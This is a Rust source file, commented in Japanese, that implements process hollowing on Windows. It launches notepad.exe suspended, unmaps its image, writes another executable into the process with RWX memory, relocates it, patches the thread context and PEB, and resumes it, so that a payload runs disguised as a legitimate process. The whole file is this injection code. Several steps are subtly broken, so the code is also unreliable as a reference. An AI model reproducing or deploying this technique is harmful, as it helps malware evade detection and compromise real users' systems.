use goblin::pe::optional_header::OptionalHeader;
use std::{
    any::Any,
    ffi::{CString, OsStr, OsString},
    fs::OpenOptions,
    io::Read,
    mem::size_of,
    ops::Add,
    os::windows::prelude::OsStrExt,
    ptr::{null, null_mut},
};
use windows::{
    core::{PCWSTR, PWSTR},
    Win32::{
        Foundation::*,
        Security,
        Storage::FileSystem::*,
        System::IO::*,
        System::{
            Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT},
            Memory::VirtualAllocEx,
            Threading::*,
        },
    },
};
use windows_sys::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};

#[allow(non_snake_case)]
#[derive(Debug)]
#[repr(C)]
pub struct BASE_RELOCATION_BLOCK {
    // リロケーション先のページアドレス
    pub page_address: u32,
    // リロケーションブロックのサイズ
    pub block_size: u32,
}

impl BASE_RELOCATION_BLOCK {
    /**
     *  エントリの数を算出する
     */
    fn entry_count(&self) -> usize {
        // block_size: データ構造全体のバイト数（ヘッダ+エントリ総数）
        // EntryBytes=block_size-sizeof(BASE_RELOCATION_BLOCK): ヘッダを除くエントリの合計バイト数
        // EntryBytes / sizeof(BASE_RELOCATION_ENTRY): リロケーションエントリ数を算出します
        let entry_size_of_byte =
            self.block_size as usize - std::mem::size_of::<BASE_RELOCATION_BLOCK>();
        entry_size_of_byte / std::mem::size_of::<BASE_RELOCATION_ENTRY>()
    }
}

#[derive(Debug, Clone)]
#[repr(C)]
struct BASE_RELOCATION_ENTRY {
    entry: u16,
}
impl BASE_RELOCATION_ENTRY {
    /**
     * RVAを取得する。
     * このRVAはBASE_RELOCATION_BLOCKのpage_addressと足し合わせることで利用できる形になる。
     */
    fn get_rva(&self) -> u16 {
        self.entry & 0x0fff
    }
    /**
     * タイプの取得する
     * https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocation-types
     */
    fn get_type(&self) -> u16 {
        (self.entry & 0xf000) >> 12
    }
}

/**
 * リロケーションテーブルを抽象的に読むための実装
 * ----------- <-- pe_image_base
 * | PE Image |  ^
 * |          |  | reloc_section_base
 * |          |  |
 * |  .reloc  |  v  <-- pe_image_base + reloc_section_base
 * | block1   |
 * | b1_entry |
 * | b1_entry |
 * | b1_entry |
 * | block2   | <-- rel_block_offset
 * | b2_entry |
 * | b2_entry |
 * | b2_entry |
 * | ...      |
 * | blockN   |
 */

struct RELOCATION_TABLE {
    // メモリ上に存在するPEイメージのベースアドレス
    pe_image_base: *const c_void,
    // メモリ上に存在するリロケーションセクション(.reloc)の
    // PEイメージベースアドレスからのオフセット
    reloc_section_base: usize,
    // 今読んでいるリロケーションブロックのオフセット
    rel_block_offset: usize,
}
impl RELOCATION_TABLE {
    fn new(pe_image_base: *const c_void, reloc_section_base: usize) -> Self {
        RELOCATION_TABLE {
            pe_image_base: pe_image_base,
            reloc_section_base: reloc_section_base,
            rel_block_offset: 0,
        }
    }
    fn get_relocation_block(&self) -> BASE_RELOCATION_BLOCK {
        unsafe {
            std::ptr::read::<BASE_RELOCATION_BLOCK>(
                (self
                    .pe_image_base
                    .add(self.reloc_section_base + self.rel_block_offset) as usize)
                    as *const _,
            )
        }
    }
    fn get_entries(&mut self) -> Vec<BASE_RELOCATION_ENTRY> {
        let block_header = self.get_relocation_block();
        self.rel_block_offset += std::mem::size_of::<BASE_RELOCATION_BLOCK>();
        let entry_count = block_header.entry_count();
        let block_entries = unsafe {
            std::slice::from_raw_parts::<BASE_RELOCATION_ENTRY>(
                self.pe_image_base
                    .add(self.reloc_section_base + self.rel_block_offset)
                    as *const _,
                entry_count,
            )
        };
        self.rel_block_offset += entry_count * std::mem::size_of::<BASE_RELOCATION_ENTRY>();
        block_entries.to_vec()
    }
    fn get_table_offset(&self) -> usize {
        self.rel_block_offset
    }
}

// 正規プロセスを立ち上げる
// 正規プロセスをくり抜く
// 偽装したいプロセスを注入する
// 走らせる
use std::mem::zeroed;
unsafe fn process_hollowing(src: impl Into<String>, dest: impl Into<String>) {
    let dest = dest.into();
    let (host_process, startup_info, proc_info) = create_process(dest.clone());
    if host_process.0 == 0 {
        return;
    }
    let mut proc_ctx = ProcessContext::new(host_process, proc_info);
    let host_entry_point = proc_ctx.get_entry_point();
    let host_image_base = proc_ctx.get_image_base() as *mut _;

    println!("image base: {:?}", host_image_base);
    let result = unmap_process(host_process, host_image_base);
    if result == false {
        panic!("Can't Unmapping.");
    }
    let source_binary = inject_file_load(src.into());
    let pe = goblin::pe::PE::parse(&source_binary.as_slice()).unwrap();
    // image_baseは再配置先のアドレスになる。
    let host_image_base = load_section(host_process, &pe, host_image_base, &source_binary);

    // // ロードされたので再配置する
    do_relocation(host_process, &pe, host_image_base, &source_binary);
    // let optional_header = pe.header.optional_header.unwrap();
    proc_ctx.set_entry_point(host_entry_point);
    proc_ctx.set_image_base(host_image_base);
    proc_ctx.commit_context();
    CloseHandle(host_process);
}

struct ProcessContext {
    ctx: CONTEXT,
    proc_info: PROCESS_INFORMATION,
    handle: HANDLE,
    peb_base: *const c_void,
    entry_point: *const c_void,
    image_base: *const c_void,
}

impl ProcessContext {
    fn new(handle: HANDLE, proc_info: PROCESS_INFORMATION) -> Self {
        let mut ctx = CONTEXT::default();
        ctx.ContextFlags = CONTEXT_FULL;
        let rctx = &mut ctx;
        unsafe {
            GetThreadContext(proc_info.hThread, rctx);
        };
        ProcessContext {
            ctx: ctx,
            proc_info: proc_info,
            handle: handle,
            image_base: null(),
            #[cfg(target_arch = "x86_64")]
            peb_base: ctx.Rdx as *const c_void,
            #[cfg(target_arch = "x86")]
            peb_base: ctx.Rdx as *const c_void, // EDX
            #[cfg(target_arch = "x86_64")]
            entry_point: ctx.Rcx as *const c_void,
            #[cfg(target_arch = "x86")]
            entry_point: ctx.Rax as *const c_void, // EAX
        }
    }
    fn get_image_base(&mut self) -> *const c_void {
        let mut image_base: *mut c_void = self.image_base as *mut _;
        if self.image_base.is_null() {
            #[cfg(target_arch = "x86_64")]
            unsafe {
                RemoteProcessMemory::read::<*const c_void>(
                    self.handle,
                    self.peb_base.add(0x10), // Windbg: dt _peb
                    &mut self.image_base as *mut *const _ as *mut _,
                );
            }
            image_base = self.image_base as *mut c_void;
        }
        image_base
    }
    fn set_image_base(&mut self, image_base: *const c_void) {
        self.image_base = image_base;
    }
    fn get_entry_point(&self) -> *const c_void {
        self.entry_point
    }
    fn set_entry_point(&mut self, entry_point: *const c_void) {
        self.ctx.Rcx = self.entry_point as u64;
    }
    fn commit_context(&self) {
        #[cfg(target_arch = "x86_64")]
        unsafe {
            RemoteProcessMemory::write::<*const c_void>(
                self.handle,
                self.peb_base.add(0x10),
                &self.image_base as *const *const _ as *const _,
            );
        }
        unsafe {
            SetThreadContext(self.proc_info.hThread, &self.ctx);
        }
    }
}

struct RemoteProcessMemory;
impl RemoteProcessMemory {
    fn write<T>(process: HANDLE, dest_addr: *const c_void, src_buffer: *const c_void) {
        unsafe {
            if WriteProcessMemory(process.0, dest_addr, src_buffer, size_of::<T>(), null_mut()) == 0
            {
                panic!("プロセスのメモリに書き込めませんでした。");
            }
        }
    }
    fn read<T>(process: HANDLE, src_addr: *const c_void, dest_buffer: *mut c_void) {
        unsafe {
            if ReadProcessMemory(process.0, src_addr, dest_buffer, size_of::<T>(), null_mut()) == 0
            {
                panic!("プロセスのメモリを読み取れませんでした。");
            }
        }
    }
}

unsafe fn inject_file_load(pe_file_path: String) -> Vec<u8> {
    let mut fd = OpenOptions::new()
        .read(true)
        .write(false)
        .open(pe_file_path)
        .unwrap();
    let file_size = fd.metadata().unwrap().len();
    println!("size: {}", file_size);
    let mut source_binary = vec![0u8; file_size as usize];
    let read_bytes = fd.read(&mut source_binary).unwrap();
    if file_size as usize != read_bytes {
        panic!("Can't read.");
    }
    source_binary
}

#[derive(Debug)]
struct Delta {
    in_memory_image_base: usize,
    linker_image_base: usize,
}
impl Delta {
    fn new(in_memory_image_base: usize, linker_image_base: usize) -> Self {
        Delta {
            in_memory_image_base: in_memory_image_base,
            linker_image_base: linker_image_base,
        }
    }
    fn get_delta(&self) -> usize {
        if self.in_memory_image_base > self.linker_image_base {
            self.in_memory_image_base - self.linker_image_base
        } else {
            self.linker_image_base - self.in_memory_image_base
        }
    }
    fn apply_delta(&self, target_image_base: usize) -> usize {
        target_image_base + self.get_delta()
    }
    fn apply_delta_from_ptr(&self, target_image_base: usize) -> *mut c_void {
        self.apply_delta(target_image_base) as *mut c_void
    }
}

// リロケーションを行うための情報収集とリロケーションの実行をする関数
unsafe fn do_relocation(
    host_process: HANDLE,
    pe: &goblin::pe::PE,
    host_process_image_base: *mut std::ffi::c_void,
    source_binary: &Vec<u8>,
) {
    let optional_header = pe.header.optional_header.unwrap();
    let rel = optional_header.data_directories.get_base_relocation_table();
    if rel.is_none() {
        return;
    }
    let in_file_image_base = optional_header.windows_fields.image_base as *mut c_void;
    let rel_delta = Delta::new(
        host_process_image_base as usize,
        in_file_image_base as usize,
    );

    let rel = rel.unwrap();
    println!(
        "relocation table : 0x{:x} / {}",
        rel.virtual_address, rel.size
    );
    //
    let section_table = pe.sections.clone();

    for section in section_table {
        if section.name().unwrap() == ".reloc" {
            println!("{}", section.name().unwrap());
            let reloc_addr = section.pointer_to_raw_data as usize;
            let mut offset: usize = 0;
            let mut reloc =
                RELOCATION_TABLE::new(source_binary.as_ptr() as *const c_void, reloc_addr);
            while reloc.get_table_offset() < rel.size as usize {
                let block_header = reloc.get_relocation_block();
                println!(
                    "Page: 0x{:X} block_size: {}",
                    block_header.page_address, block_header.block_size
                );
                let block_entries = reloc.get_entries();
                println!("entries: {}", block_entries.len());
                for entry in block_entries {
                    // 0: IMAGE_REL_BASED_ABSOLUTE: 再配置不要
                    if entry.get_type() == 0 {
                        continue;
                    }
                    let rel_rva = block_header.page_address + entry.get_rva() as u32;
                    println!(
                        "rva: 0x{:X}  type: {}",
                        block_header.page_address + entry.get_rva() as u32,
                        entry.get_type()
                    );
                    println!(
                        "target image-base: {:p} rel_rva: 0x{:x} rel-delta: 0x{:x}",
                        host_process_image_base,
                        rel_rva,
                        rel_delta.get_delta()
                    );
                    apply_relocation(
                        host_process,
                        host_process_image_base.add(rel_rva as usize),
                        &rel_delta,
                    );
                }
            }
        }
    }
}

pub(crate) fn main() {
    unsafe {
        // process_hollowing("./a.exe", "C:\\Windows\\System32\\notepad.exe");
        process_hollowing("./a_reloc.exe", "C:\\Windows\\System32\\notepad.exe");
    }
}
// リロケーションを実際に行う。
unsafe fn apply_relocation(process: HANDLE, target: *mut c_void, rel_delta: &Delta) {
    let mut addr: u64 = 0;
    if ReadProcessMemory(
        process.0,
        target,
        &mut addr as *const _ as *mut _,
        size_of::<u64>(),
        null_mut(),
    ) == 0
    {
        panic!("プロセスのメモリを読み取れませんでした。");
    }
    rel_delta.apply_delta(addr as usize);
    if WriteProcessMemory(
        process.0,
        target,
        &mut addr as *const _ as *mut _,
        size_of::<u64>(),
        null_mut(),
    ) == 0
    {
        panic!("プロセスのメモリに書き込めませんでした。");
    }
}

use goblin::{error, pe};
use std::ffi::c_void;
use windows::Win32::System::Memory::*;

unsafe fn load_section(
    process: HANDLE,
    pe: &goblin::pe::PE,
    image_base: *mut std::ffi::c_void,
    source_binary: &Vec<u8>,
) -> *mut c_void {
    let optional_header = pe.header.optional_header.unwrap();
    let size_of_source_image = optional_header.windows_fields.size_of_image;
    println!(
        "image size: {}(0x{:x}) bytes",
        size_of_source_image, size_of_source_image
    );
    // 元々のimage_baseで確保してみる
    let new_dest_image_base = image_base as *const std::ffi::c_void;
    let new_dest_image_base = VirtualAllocEx(
        process,
        new_dest_image_base,
        size_of_source_image.try_into().unwrap(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    // 元々のimage_baseで確保できなかった場合は確保できる場所から取る
    let new_dest_image_base = if new_dest_image_base.is_null() {
        VirtualAllocEx(
            process,
            null_mut(),
            size_of_source_image.try_into().unwrap(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    } else {
        new_dest_image_base
    };
    let delta_img_base =
        new_dest_image_base.sub(optional_header.windows_fields.image_base as usize);
    println!(
        "delta image base: {:p}-{:x}={:p}",
        new_dest_image_base, optional_header.windows_fields.image_base, delta_img_base
    );
    if new_dest_image_base.is_null() {
        panic!("Can't remote memory allocate. VirtualAllocEx");
    }
    // ファイルヘッダの書き込み
    if WriteProcessMemory(
        process.0,
        new_dest_image_base,
        source_binary.as_ptr() as *mut c_void,
        optional_header.windows_fields.size_of_headers as usize,
        null_mut(),
    ) == 0
    {
        panic!("プロセスメモリにファイルヘッダを書き込めませんでした。");
    }
    // セクションヘッダの読み込み
    for section in &pe.sections {
        if size_of_source_image < section.virtual_address {
            panic!("確保したメモリよりも書き込み先のアドレスが大きいので終了。");
        }
        let dest_section = new_dest_image_base.add(section.virtual_address as usize);
        println!("writing: {:p}", dest_section);
        if WriteProcessMemory(
            process.0,
            dest_section,
            (source_binary.as_ptr() as *mut c_void).add(section.pointer_to_raw_data as usize),
            optional_header.windows_fields.size_of_headers as usize,
            null_mut(),
        ) == 0
        {
            panic!("プロセスメモリにセクションヘッダを書き込めませんでした。");
        }
    }
    new_dest_image_base
}

fn create_process(command_line: String) -> (HANDLE, STARTUPINFOW, PROCESS_INFORMATION) {
    let mut start_info = unsafe { zeroed::<STARTUPINFOW>() };
    start_info.cb = size_of::<STARTUPINFOW>() as u32;
    let mut proc_info = unsafe { zeroed::<PROCESS_INFORMATION>() };
    let mut cmd_line = OsString::from(command_line + "\0")
        .encode_wide()
        .collect::<Vec<u16>>();
    let dest = PWSTR(cmd_line.as_mut_ptr());
    let err = unsafe {
        CreateProcessW(
            PCWSTR::default(),
            dest,
            null(),
            null(),
            false,
            CREATE_SUSPENDED,
            null(),
            PCWSTR::default(),
            &mut start_info,
            &mut proc_info,
        )
    };
    if err == false {
        println!("GetLastError: {}", unsafe { GetLastError().0 });
    }
    (proc_info.hProcess, start_info, proc_info)
}

use ntapi::{ntmmapi::NtUnmapViewOfSection, winapi::um::winnt::CONTEXT_FULL};
unsafe fn unmap_process(process: HANDLE, image_base: *mut std::ffi::c_void) -> bool {
    let result = NtUnmapViewOfSection(
        process.0 as *mut ntapi::winapi::ctypes::c_void,
        image_base as *mut ntapi::winapi::ctypes::c_void,
    );
    if result != 0 {
        return false;
    }
    true
}

struct ProcessEnvironmentBlock {
    h_process: HANDLE,
    peb: *mut core::ffi::c_void,
}
impl ProcessEnvironmentBlock {
    fn new(h_process: HANDLE) -> Self {
        unsafe {
            let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();
            NtQueryInformationProcess(
                h_process,
                PROCESSINFOCLASS(0),
                &mut pbi as *const _ as *mut _,
                size_of::<PROCESS_BASIC_INFORMATION>() as _,
                null_mut(),
            );
            ProcessEnvironmentBlock {
                h_process: h_process,
                peb: pbi.PebBaseAddress as *mut core::ffi::c_void,
            }
        }
    }

    fn get_image_base(&self) -> *mut c_void {
        unsafe {
            let mut image_base = zeroed::<*mut core::ffi::c_void>();
            let peb_image_base_offset = 0x10;
            ReadProcessMemory(
                self.h_process.0,
                (self.peb).add(peb_image_base_offset),
                &mut image_base as *const _ as *mut _,
                size_of::<*mut core::ffi::c_void>(),
                null_mut(),
            );
            image_base
        }
    }
}
